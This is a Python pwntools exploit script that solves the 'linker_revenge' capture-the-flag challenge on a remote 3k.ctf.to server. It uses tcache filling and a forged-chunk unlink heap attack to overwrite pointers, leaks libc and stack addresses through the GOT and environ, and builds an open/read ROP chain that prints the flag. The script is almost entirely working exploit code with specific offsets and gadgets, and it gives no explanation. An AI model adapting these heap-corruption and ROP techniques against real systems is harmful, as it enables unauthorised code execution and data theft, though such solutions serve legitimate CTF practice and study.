from time import sleep

from pwn import *
from pwn import log as Log

puts_plt = 0x400820
start = 0x4006d0
pop_rdi = 0x0000000000400e83
main_start_got = 0x0000000000601ff0
free_got = 0x0000000000601f78


def log(title, value):
    Log.success(title + " --> {} ".format(hex(value)))


HOST = "linker-revenge.3k.ctf.to"
PORT = 9632
elf = ELF("linker_revenge")
p = remote(HOST, PORT)

name = elf.symbols["name"]
period = 0.2
chunk_addr = name - 0x30


def new_page(size):
    p.sendline("1")
    sleep(period)
    p.recv(8000)
    p.sendline(str(size))
    sleep(period)
    p.recv(8000)


def view_page(index):
    p.sendline("5")
    sleep(period)
    p.recvuntil("index:\n")
    p.sendline(str(index))
    sleep(period)
    # p.interactive()
    data = p.recvline().strip()
    p.recv(8000)
    return data


def edit(index, data):
    p.sendline("2")
    sleep(period)
    p.recv(8000)
    p.sendline(str(index))
    sleep(period)
    p.recv(8000)
    p.send(data)
    sleep(period)
    p.recv(8000)


def delete_page(index):
    p.sendline("3")
    sleep(period)
    p.recv(8000)
    p.sendline(str(index))
    sleep(period)
    p.recv(8000)


def login(size, name):
    p.recv(8000)
    p.sendline(str(size))
    sleep(period)
    p.recv(8000)
    p.send(name)
    sleep(period)
    p.recv(8000)


def relogin(name):
    p.sendline("4")
    sleep(period)
    p.recv(8000)
    p.send(name)
    sleep(period)
    p.recv(8000)


def Exit():
    p.sendline("6")
    sleep(period)


def delete_leak(index):
    p.sendline("3")
    sleep(period)
    p.recv(8000)
    p.sendline(str(index))
    sleep(period)


unlink = name - 0x48

login(8, "flag")
Log.info("tcache...")
for _ in range(7):
    new_page(0x128)
    delete_page(0)
Log.info("tcache done\n\n")
new_page(0x128)
new_page(0x128)
delete_page(0)
edit(0, p64(0) + p64(0x121) + p64(chunk_addr - 0x18) + p64(chunk_addr - 0x10) + b"A" * 0x100 + p64(0x120))
delete_page(1)
Log.info("unlink done\n\n")
edit(0, p32(1) + p32(0) + p64(0) * 2 + p64(unlink) + p64(free_got) + p64(main_start_got))
Log.info("leak...")
data = view_page(2)
leak = u64(data.ljust(8, b"\x00"))
log("leak", leak)
base = leak - 0x21ab0
log("base", base)
opn = base + 0x000000000010fd50
rd = base + 0x0000000000110180
wrt = base + 0x0000000000110250
pop_rdx = base + 0x0000000000001b96
pop_rsi = base + 0x0000000000023e8a
environ = base + 0x00000000003ee098
pop_rdi = base + 0x000000000002155f
flag_file = name

edit(0, p32(1) + p32(0) + p64(0) * 2 + p64(unlink) + p64(free_got) + p64(environ))
stack = view_page(2)
stack = u64(stack.ljust(8, b"\x00"))
log("stack", stack)
ret_ptr = stack - 0x140
edit(0, p32(1) + p32(0) + p64(0) * 2 + p64(unlink) + p64(ret_ptr) + p64(ret_ptr))
rop = b""
rop += p64(pop_rdi)
rop += p64(flag_file)
rop += p64(pop_rsi)
rop += p64(0)
rop += p64(opn)
# read
rop += p64(pop_rdi)
rop += p64(6)
rop += p64(pop_rsi)
rop += p64(flag_file + 0x200)
rop += p64(pop_rdx)
rop += p64(50)
rop += p64(rd)
rop += p64(0x000000000040121d)
Log.info("leak done\n\n")

Log.info("ropping...")
edit(1, rop)
edit(0, p32(1) + p32(0) + p64(0) * 2 + p64(unlink) + p64(free_got) + p64(flag_file + 0x200))
p.sendline("5")
sleep(period)
p.sendline("2")
sleep(period)
p.recvuntil("index:\n")
Log.success("flag --> %s" % p.recvline().decode())

# FLAG --> 3k{this_is_just_a_random_string_here_yay}
